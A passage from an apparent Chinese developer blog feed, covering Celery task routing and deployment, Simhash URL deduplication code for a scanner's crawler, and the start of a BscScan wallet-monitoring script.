<li>减少误报的同时,则会产生漏报问题…</li>
</ol>
</blockquote>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="https://studygolang.com/articles/13875">图解 Go 并发编程</a></li>
<li><a href="https://www.kancloud.cn/hartnett/gopl-zh/126058">第八章 Goroutines和Channels</a></li>
<li><a href="https://juejin.im/entry/5acac667518825619d4d0f44">Golang并发编程</a></li>
<li><a href="https://blog.csdn.net/john_f_lau/article/details/50923380">Go计算运行的时间</a></li>
<li><a href="https://stackoverflow.com/questions/35179656/slice-chunking-in-go">Slice chunking in Go</a></li>
</ul>
<h1 id="question"><a href="#question" class="headerlink" title="question:"></a>question:</h1><ol>
<li>什么场景下goroutine会比python的thread有优势?</li>
<li>减少误报的同时如何减少漏报?</li>
</ol>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>Celery-动态路由</title>
    <url>//42649.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>在使用celery的时候,可以根据任务情况(任务类型,任务参数),更灵活的把任务分发到不同的队列里.</p>
<hr>
<h1 id="任务的去向"><a href="#任务的去向" class="headerlink" title="任务的去向"></a>任务的去向</h1><p>在Celery中, 任务的目的是由下列因素决定（按顺序）:</p>
<ol>
<li>task_routes 中定义的路由 </li>
<li>Task.apply_async() 方法的路由参数 </li>
<li>Task 本身定义的路由相关属性</li>
</ol>
<p>最佳实践是<strong>不写死这些设置，而是通过 Routers 将它作为配置选项；这是最灵活的方式</strong>，但是合理的默认值仍然可以设置称任务属性。</p>
<hr>
<h1 id="手动路由做法"><a href="#手动路由做法" class="headerlink" title="手动路由做法:"></a>手动路由做法:</h1><p>一般都会在celery的配置文件里静态写死队列和路由即默认值.如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">CELERY_QUEUES=(Queue(<span class="string">&quot;fingerprint&quot;</span>, Exchange(<span class="string">&quot;fingerprint&quot;</span>),routing_key=<span class="string">&quot;fingerprint&quot;</span>),  <span class="comment"># 指纹识别)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">CELERY_ROUTES=&#123; <span class="string">&#x27;fingerprint_all_scanner.tasks.startDetectUrl&#x27;</span>: &#123;<span class="string">&quot;queue&quot;</span>: <span class="string">&quot;fingerprint&quot;</span>, <span class="string">&quot;routing_key&quot;</span>: <span class="string">&quot;fingerprint&quot;</span>&#125;,&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="动态路由做法"><a href="#动态路由做法" class="headerlink" title="动态路由做法:"></a>动态路由做法:</h1><p>自定义一个Router类</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyRouter</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">route_for_task</span>(<span class="params">self, task, args=<span class="literal">None</span>, kwargs=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="built_in">print</span> task  <span class="comment"># 任务类型</span></span><br><span class="line">        <span class="built_in">print</span> args  <span class="comment"># 列表任务参数</span></span><br><span class="line">        <span class="built_in">print</span> kwargs <span class="comment"># 键值对任务参数</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 在此处可以自定义代码,可以根据任务参数或者任务类型更灵活的将任务发到不同的队列里</span></span><br><span class="line">        <span class="keyword">if</span> task.startswith(<span class="string">&#x27;fingerprint_all_scanner&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;queue&quot;</span>: <span class="string">&quot;fingerprint&quot;</span>, <span class="string">&quot;routing_key&quot;</span>: <span class="string">&quot;fingerprint&quot;</span>&#125;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后把配置替换为如下即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">CELERY_ROUTES=(MyRouter(),)</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="https://blog.csdn.net/zhangfh1990/article/details/77043562">Celery消息队列—-路由任务</a></li>
<li><a href="http://docs.jinkan.org/docs/celery/userguide/routing.html#routers">Routing Tasks</a></li>
<li><a href="https://www.jianshu.com/p/b3d2c5871bec">celery路由和交换的相关知识</a></li>
</ul>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>Celery-任务调度框架实践</title>
    <url>//40513.html</url>
    <content><![CDATA[<h1 id="celery架构图："><a href="#celery架构图：" class="headerlink" title="celery架构图："></a>celery架构图：</h1><ol>
<li><p>Celery Beat：任务调度器，Beat进程会读取配置文件的内容，周期性地将配置中到期需要执行的任务发送给任务队列。</p>
</li>
<li><p>Celery Worker：执行任务的消费者，通常会在多台服务器运行多个消费者来提高执行效率。</p>
</li>
<li><p>Broker：消息代理，或者叫作消息中间件，接受任务生产者发送过来的任务消息，存进队列再按序分发给任务消费方（通常是消息队列或者数据库）。</p>
</li>
<li><p>Producer：调用了Celery提供的API、函数或者装饰器而产生任务并交给任务队列处理的都是任务生产者。</p>
</li>
<li><p>Result Backend：任务处理完后保存状态信息和结果，以供查询。Celery默认已支持Redis、RabbitMQ、MongoDB、Django ORM、SQLAlchemy等方式。</p>
</li>
</ol>
<p><img src="https://i.loli.net/2019/04/26/5cc2e35803f2f.jpg"></p>
<hr>
<h1 id="初始化"><a href="#初始化" class="headerlink" title="初始化:"></a>初始化:</h1><h2 id="1-运行celery"><a href="#1-运行celery" class="headerlink" title="1.运行celery"></a>1.运行celery</h2><p>mac环境下的celery一下载就能直接运行。<br>但是centos6.9 环境下好像下载之后并不能直接运行，估计是环境变量没有配好。<br>需要加上celery的安装路径。<br>使用<code>/usr/local/bin/celery -A your_app worker --loglevel=info</code></p>
<hr>
<h2 id="2-以守护进程运行celery"><a href="#2-以守护进程运行celery" class="headerlink" title="2.以守护进程运行celery:"></a>2.以守护进程运行celery:</h2><p>需要一个初始化脚本：celeryd</p>
<ul>
<li><p>使用方法：&#x2F;etc&#x2F;init.d&#x2F;celeryd {start|stop|restart|status}</p>
</li>
<li><p>配置文件:&#x2F;etc&#x2F;default&#x2F;celeryd</p>
</li>
</ul>
<p>参考：</p>
<ul>
<li><a href="https://stackoverflow.com/questions/14275821/how-to-run-celery-as-a-daemon-in-production">How to run celery as a daemon in production?</a></li>
<li><a href="http://blog.csdn.net/happyAnger6/article/details/51626516">Celery教程————-以守护进程方式运行worker</a></li>
</ul>
<hr>
<h2 id="3-使用redis"><a href="#3-使用redis" class="headerlink" title="3.使用redis:"></a>3.使用redis:</h2><p>mac下安装redis</p>
<ul>
<li>brew install redis</li>
<li>如果需要后台运行 redis 服务，使用命令 brew services start redis</li>
<li>如果不需要后台服务，则使用命令 redis-server &#x2F;usr&#x2F;local&#x2F;etc&#x2F;redis.conf。</li>
<li><a href="https://www.jianshu.com/p/3bdfda703552">mac os 安装 redis</a></li>
</ul>
<p>安装redis后，启动时指定配置文件</p>
<ul>
<li><code>redis-server ./redis.conf</code></li>
</ul>
<p>检测后台进程是否存在  </p>
<ul>
<li><code>ps -ef |grep redis </code></li>
</ul>
<p>使用分布式时，其他worker机子无法访问redis去取任务：</p>
<ul>
<li>redis默认的安全策略，只准许本地访问。</li>
<li>需要通过简单配置，完成允许外网访问。</li>
<li>参考：<a href="http://www.cnblogs.com/likwo/p/5903377.html">开启redis 允许外网IP 访问</a></li>
</ul>
<hr>
<h1 id="celery基本操作命令："><a href="#celery基本操作命令：" class="headerlink" title="celery基本操作命令："></a>celery基本操作命令：</h1><p>参考：</p>
<ul>
<li><a href="http://funhacks.net/explore-python/Third-Party-Modules/celery.html">Celery基础操作</a></li>
<li><a href="http://blog.csdn.net/libing_thinking/article/category/7287529">Celery-4.1 用户指南</a></li>
</ul>
<hr>
<h1 id="celery-worker"><a href="#celery-worker" class="headerlink" title="celery worker:"></a>celery worker:</h1><h2 id="1-启动worker"><a href="#1-启动worker" class="headerlink" title="1.启动worker:"></a>1.启动worker:</h2><ul>
<li><code>export PYTHONOPTIMIZE=1 &amp;&amp; /usr/local/bin/celery -A your_app worker --loglevel=debug --workdir=/your_dir/your_dir/your_dir/ </code></li>
</ul>
<hr>
<h2 id="2-停止worker"><a href="#2-停止worker" class="headerlink" title="2.停止worker:"></a>2.停止worker:</h2><p><code>ps auxww | grep &#39;celery worker&#39; | awk &#39;&#123;print $2&#125;&#39; | xargs kill -9</code></p>
<hr>
<h2 id="3-在celery中使用多进程："><a href="#3-在celery中使用多进程：" class="headerlink" title="3.在celery中使用多进程："></a>3.在celery中使用多进程：</h2><p>我用的是<code>from multiprocessing import Pool</code>来实现多进程。<br>但是在运行过程中会直接报出这个错误<br><code>AssertionError: daemonic processes are not allowed to have children</code></p>
<p>解决方法：</p>
<ul>
<li><p>重写一个Mypool<code>https://stackoverflow.com/questions/6974695/python-process-pool-non-daemonic</code></p>
</li>
<li><p>设置环境变量<br><code>export PYTHONOPTIMIZE=1</code></p>
</li>
</ul>
<p>由于过段时间就会失效。。所以每次启动worker的时候的时候：<br><code>export PYTHONOPTIMIZE=1 &amp;&amp; /usr/local/bin/celery -A your_app worker --loglevel=debug --workdir=/your_dir/your_dir/your_dir/</code></p>
<p>以下 的方法没试过：</p>
<blockquote>
<p>there are two method to solve this problem ,disable assert：<br>1.where celery starts set export PYTHONOPTIMIZE&#x3D;1 OR start celery with this parameter -O OPTIMIZATION<br>2.disable python packet multiprocessing process.py line 102:<br>assert not _current_process._config.get(‘daemon’), \ ‘daemonic processes are not allowed to have children’</p>
</blockquote>
<hr>
<h2 id="4-调用worker、添加任务："><a href="#4-调用worker、添加任务：" class="headerlink" title="4.调用worker、添加任务："></a>4.调用worker、添加任务：</h2><p>delay()和apply_async()</p>
<p>我们之前调用任务使用了”delay()”方法，它其实是对”apply_async()”方法的封装，使得你只要传入任务所需的参数即可。对于特殊的任务调度需求，你需要使用”apply_async()”，其常用的参数有：</p>
<ul>
<li>countdown: 指定多少秒后任务才被执行</li>
<li>eta: 指定任务被调度的时间，参数类型是datetime</li>
<li>expires: 任务过期时间，参数类型可以是int（秒），也可以是datetime</li>
<li>retry: 任务发送失败的重试次数</li>
<li>priority: 任务优先级，范围是0-9</li>
<li>serializer: 参数和返回值的序列化方式</li>
</ul>
<hr>
<h1 id="celery-beat-定时任务"><a href="#celery-beat-定时任务" class="headerlink" title="celery beat 定时任务"></a>celery beat 定时任务</h1><h2 id="一个时间的Bug："><a href="#一个时间的Bug：" class="headerlink" title="一个时间的Bug："></a>一个时间的Bug：</h2><ul>
<li>当前使用pip安装的celery，默认是安装的最新版本4.1.0，但是在这个版本中在获取当前时间的逻辑中存在bug，会导致定时任务配置后并不能在指定的时间被执行</li>
<li>回退版本 到4.0.2才行</li>
<li><a href="http://axiaoxin.com/article/228/">celery 4.1.0 版本定时任务执行时间 bug</a></li>
</ul>
<p>另一种可行但麻烦的思路：</p>
<p>celery的定时任务会有一定时间的延迟。比如，我规定模拟登陆新浪微博任务每隔10个小时执行一次，那么定时任务第一次执行就会在开启定时任务之后的10个小时后才会执行。而我抓取微博需要马上执行，需要带上cookie，所以不能等那1个小时。这个没有一个比较好的解决方法，可以使用celery的crontab()来代替schdule做定时，它会在启动的时候就执行。我采用的方法是第一次手动执行该任务，然后再通过schedule执行。</p>
<hr>
<h2 id="使用命令："><a href="#使用命令：" class="headerlink" title="使用命令："></a>使用命令：</h2><p>进入到对应your_app对应的目录下：<code>cd /your_dir/your_dir/your_dir</code><br>再执行：<code>/usr/local/bin/celery -A your_app beat -l info </code></p>
<p>最方便的是，在命令中指定工作目录，一条命令即可：</p>
<p><code>/usr/local/bin/celery -A your_dir beat -l info --workdir=/your_dir/your_dir/your_dir/</code></p>
<hr>
<h2 id="定时任务参数参考表："><a href="#定时任务参数参考表：" class="headerlink" title="定时任务参数参考表："></a>定时任务参数参考表：</h2><p><img src="https://i.loli.net/2019/04/26/5cc2e358c3d84.jpg"></p>
<hr>
<h2 id="动态管理定时任务："><a href="#动态管理定时任务：" class="headerlink" title="动态管理定时任务："></a>动态管理定时任务：</h2><p>查过挺多资料，有两种解决方法。跟celery运行的调度器(schedule)息息相关的。</p>
<ul>
<li>使用第三方schedule：<br>如django-celery-beat库会将定时任务的规则存入到数据库中，而不用通过配置文件来定义。</li>
</ul>
<p>try to install django-celery instead of django-celery-beat. django-celery works with Celery 3 (unlike django-celery-beat). You can then, for example import PeriodicTask from djcelery.models instead of from django_celery_beat.models . This allows you to add&#x2F;delete&#x2F;manipulate tasks both dynamically AND PROGRAMMATICALLY (not only from the Django admin site). The drawback to this workaround is that if one doesn’t need django-celery for anything other than this, then it bloats one’s app. Thus, It would be better to have Celery 4.0 included in cookiecutter-django so that django-celery-beat models can be used</p>
<p><a href="http://www.liuliqiang.info/post/celery-advanced-topic-scheduler-and-priority/">【celery进阶】定时任务和优先级</a></p>
<ul>
<li>使用框架默认schedule</li>
</ul>
<p>我使用的是这一种方法。<br>只能管理celery的配置文件了，每次增加或减少定时任务的时候，都要对配置文件进行相应的修改。<br>每次修改完都要重启celerybeat，试过多种方法，发现用supervisor来管理celery beat的进程是比较好的。</p>
<hr>
<h2 id="管理celery-beat进程"><a href="#管理celery-beat进程" class="headerlink" title="管理celery beat进程"></a>管理celery beat进程</h2><p>用supervisor来管理celery beat进程。</p>
<ul>
<li><p>安装：<code>pip install supervisor</code></p>
</li>
<li><p>Supervisor配置</p>
</li>
<li><p><code>/usr/local/bin/echo_supervisord_conf  &gt; /etc/supervisord.conf</code></p>
</li>
<li><p><img src="https://i.loli.net/2019/04/26/5cc2e359693ae.jpg"></p>
</li>
<li><p>操作：</p>
</li>
<li><p>开启:<code>supervisord -c /etc/supervisord.conf</code></p>
</li>
<li><p>重启：<code>supervisorctl -c /etc/supervisord.conf reload</code></p>
</li>
<li><p>关闭:<code>supervisorctl -c /etc/supervisord.conf shutdown</code></p>
</li>
</ul>
<hr>
<h1 id="other"><a href="#other" class="headerlink" title="other:"></a>other:</h1><h2 id="分布式："><a href="#分布式：" class="headerlink" title="分布式："></a>分布式：</h2><ul>
<li><a href="https://www.213.name/archives/1105">笔记：集群部署celery分布式任务队列</a></li>
<li><a href="https://www.jianshu.com/p/ee14ed9e4989">《Python分布式计算》 第4章 Celery分布式应用 （Distributed Computing with Python）</a></li>
</ul>
<p><img src="https://i.loli.net/2019/04/26/5cc2e35a0c484.jpg"></p>
<hr>
<h2 id="队列："><a href="#队列：" class="headerlink" title="队列："></a>队列：</h2><ul>
<li><a href="https://www.jianshu.com/p/1f528c518ab5">Celery从入门到放弃</a></li>
<li><a href="http://blog.csdn.net/vintage_1/article/details/47664139">celery beat实战</a></li>
</ul>
<hr>
<h2 id="flower"><a href="#flower" class="headerlink" title="flower:"></a>flower:</h2><p>图形化管理celery界面：</p>
<p><code>/usr/local/bin/celery -A celery_app flower --port=5555</code></p>
<hr>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><ul>
<li><a href="https://www.mkernel.com/?p=117">Python异步神器-Celery实战之Nmap扫描</a></li>
<li><a href="https://hk.saowen.com/a/76cb411ce1023c1ee172406691abe47d7939a4b2d8c56a8439aab39f4486df30">企業安全實踐(基礎建設)之主動分佈式WEB資產掃描</a></li>
<li><a href="http://blog.csdn.net/junli_chen/article/details/73504343">Celery 框架学习笔记</a></li>
<li><a href="http://blog.csdn.net/kk123a/article/details/74549117">celery配置使用</a></li>
</ul>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>Crawler-利用Simhash做URL去重</title>
    <url>//40924.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>为了防止扫重复的url以及提高扫描效率,url去重扫描器的爬虫中必不可少的一部分.</p>
<hr>
<h1 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路:"></a>实现思路:</h1><h2 id="第一步：泛化"><a href="#第一步：泛化" class="headerlink" title="第一步：泛化"></a>第一步：泛化</h2><p>解析URL的每个参数，把每个参数的值做泛化.</p>
<p>例如将参数值里面的字母转化为A，数字转化为N，特殊符号转换为T，其他符号或者字符转化成C</p>
<p>例如:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://tuan.qunar.com/?in_track=home_tuan_content&amp;list=gengduo</span><br><span class="line">http://tuan.qunar.com/?in_track=home_tuan_content&amp;tag=jiage_xiaoyu50</span><br><span class="line">http://tuan.qunar.com/?in_track=home_tuan_content&amp;tag=jiage_50dao100</span><br><span class="line">http://tuan.qunar.com/?in_track=home_tuan_content&amp;tag=jiage_100dao150</span><br><span class="line">http://tuan.qunar.com/?in_track=home_tuan_content&amp;tag=jiage_150dao200</span><br><span class="line">http://tuan.qunar.com/?in_track=home_tuan_content&amp;tag=jiage_200dao500</span><br></pre></td></tr></table></figure>

<p>经过泛化后则为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://tuan.qunar.com/?in_track=home_tuan_content&amp;list=gengduo</span><br><span class="line">http://tuan.qunar.com/?list=AAAAAAA&amp;in_track=AAAATAAAATAAAAAAA</span><br><span class="line">http://tuan.qunar.com/?in_track=home_tuan_content&amp;tag=jiage_xiaoyu50</span><br><span class="line">http://tuan.qunar.com/?tag=AAAAATAAAAAANN&amp;in_track=AAAATAAAATAAAAAAA</span><br><span class="line">http://tuan.qunar.com/?in_track=home_tuan_content&amp;tag=jiage_50dao100</span><br><span class="line">http://tuan.qunar.com/?tag=AAAAATNNAAANNN&amp;in_track=AAAATAAAATAAAAAAA</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="第二步-Simhash"><a href="#第二步-Simhash" class="headerlink" title="第二步: Simhash"></a>第二步: Simhash</h2><p>Simhash是Google处理网页去重的算法.</p>
<p>Simhash的作用简单来说就是判断两个URL是否相似，如果汉明距离在一定范围内，就可判断两个URL相似。</p>
<hr>
<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码:"></a>完整代码:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2019/8/5 8:41 PM</span></span><br><span class="line"><span class="comment"># @Author  : Jerry</span></span><br><span class="line"><span class="comment"># @Desc    : refs: https://docs.ioin.in/writeup/www.noblexu.com/_%E5%88%A9%E7%94%A8Simhash%E5%81%9AURL%E5%8E%BB%E9%87%8D%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F_/index.html</span></span><br><span class="line"><span class="comment"># @File    : filter.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse <span class="keyword">as</span> urlparse</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">from</span> simhash <span class="keyword">import</span> Simhash</span><br><span class="line"></span><br><span class="line">Chars = [<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;_&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">url_etl</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    url泛化处理</span></span><br><span class="line"><span class="string">    :param url: 原始url</span></span><br><span class="line"><span class="string">    :return: 处理过后的url</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    params_new = &#123;&#125;</span><br><span class="line">    u = urlparse.urlparse(url)</span><br><span class="line">    query = unquote(u.query)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> query:</span><br><span class="line">        <span class="keyword">return</span> url</span><br><span class="line">    path = unquote(u.path)</span><br><span class="line">    params = urlparse.parse_qsl(query, <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> params:</span><br><span class="line">        <span class="keyword">if</span> v:</span><br><span class="line">            params_new[k] = etl(v)</span><br><span class="line">    query_new = urllib.parse.urlencode(params_new)</span><br><span class="line">    url_new = urlparse.urlunparse(</span><br><span class="line">        (u.scheme, u.netloc, u.path, u.params, query_new, u.fragment))</span><br><span class="line">    <span class="comment"># print url_new</span></span><br><span class="line">    <span class="keyword">return</span> url_new</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">etl</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    传入一个字符串，将里面的字母转化为A，数字转化为N，特殊符号转换为T，其他符号或者字符转化成C</span></span><br><span class="line"><span class="string">    :param str: </span></span><br><span class="line"><span class="string">    :return: </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    chars = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        c = c.lower()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= <span class="built_in">ord</span>(c) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">            chars += <span class="string">&#x27;A&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) &lt;= <span class="built_in">ord</span>(c) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;9&#x27;</span>):</span><br><span class="line">            chars += <span class="string">&#x27;N&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> c <span class="keyword">in</span> Chars:</span><br><span class="line">            chars += <span class="string">&#x27;T&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            chars += <span class="string">&#x27;C&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> chars</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">url_compare</span>(<span class="params">url, link</span>):</span><br><span class="line">    dis = Simhash(url).distance(Simhash(link))</span><br><span class="line">    <span class="keyword">if</span> -<span class="number">2</span> &lt; dis &lt; <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reduce_urls</span>(<span class="params">ori_urls</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    对url列表去重</span></span><br><span class="line"><span class="string">    :param ori_urls: 原始url列表</span></span><br><span class="line"><span class="string">    :return: 去重后的url列表</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    etl_urls = []</span><br><span class="line">    result_urls = []</span><br><span class="line">    <span class="keyword">for</span> ori_url <span class="keyword">in</span> ori_urls:</span><br><span class="line">        etl = url_etl(ori_url)</span><br><span class="line">        <span class="built_in">print</span>(etl)</span><br><span class="line">        score = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> etl_urls:</span><br><span class="line">            <span class="keyword">for</span> etl_url <span class="keyword">in</span> etl_urls:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> url_compare(etl, etl_url):</span><br><span class="line">                    score += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> score == <span class="built_in">len</span>(etl_urls):</span><br><span class="line">                result_urls.append(ori_url)</span><br><span class="line">                etl_urls.append(etl)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            etl_urls.append(etl)</span><br><span class="line">            result_urls.append(ori_url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result_urls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    test_list = [</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58963&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58964&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58965&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58966&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58967&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58968&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58969&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58970&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58971&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58972&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58973&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58974&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58975&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58976&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58977&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;http://xxx.com/_visitcountdisplay?siteId=64&amp;type=3&amp;article=58978&#x27;</span>,</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(len(test_list))</span></span><br><span class="line">    <span class="built_in">print</span>(reduce_urls(test_list))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># url = &#x27;http://tuan.qunar.com/ext/sact/RjABVv?in_track=home_tuan_content_lunbo&#x27;</span></span><br><span class="line">    <span class="comment"># print(url_etl(url))</span></span><br><span class="line">    <span class="comment"># print(etl(url))</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>基于布尔的sql注入扫描起来需要发比较多的测试payload</p>
<p>一开始爬虫没对url进行去重,然后遇到咨询类网站的时候.</p>
<p>就发现前面爬的几十条链接都是几乎一样的,参数也是一样</p>
<p>但是因为没有去重导致一直重复在扫这个页面的这几个参数.</p>
<p>效率和效果都非常差,加了过滤之后,需要扫描的url少了很多.效率提高了不少.</p>
<p>但是这个时候也要注意,要看看有没因过滤而漏掉的url,宁愿重复扫也不要漏扫太多…</p>
<hr>
<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="https://docs.ioin.in/writeup/www.noblexu.com/_%E5%88%A9%E7%94%A8Simhash%E5%81%9AURL%E5%8E%BB%E9%87%8D%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F_/index.html">利用Simhash做URL去重的实现方式</a></li>
</ul>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-Bp宝石回购监控脚本</title>
    <url>//32598.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>来自朋友的需求,bp项目方某个钱包地址每隔一段时间就会回购宝石代币<br>要监控该钱包回购的动作</p>
<hr>
<h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本:"></a>脚本:</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路:"></a>思路:</h2><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211008145806.png" alt="20211008145806"></p>
<p>一开始打算用爬虫,不过想起之前写<code>rarity</code>的升级脚本调用过<code>ftmscan</code>的api</p>
<p>所以看了一下<code>bscscan</code>的api文档，找到个方法能满足需求</p>
<p><code>Get a list of &#39;Normal&#39; Transactions By Address</code>获取地址的交易记录</p>
<hr>
<h2 id="解析input-data"><a href="#解析input-data" class="headerlink" title="解析input data:"></a>解析input data:</h2><p><code>https://api.bscscan.com/api?module=account&amp;action=txlist&amp;address=0xF426a8d0A94bf039A35CEE66dBf0227A7a12D11e&amp;startblock=0&amp;endblock=99999999&amp;page=1&amp;offset=10&amp;sort=asc&amp;apikey=YourApiKeyToken</code></p>
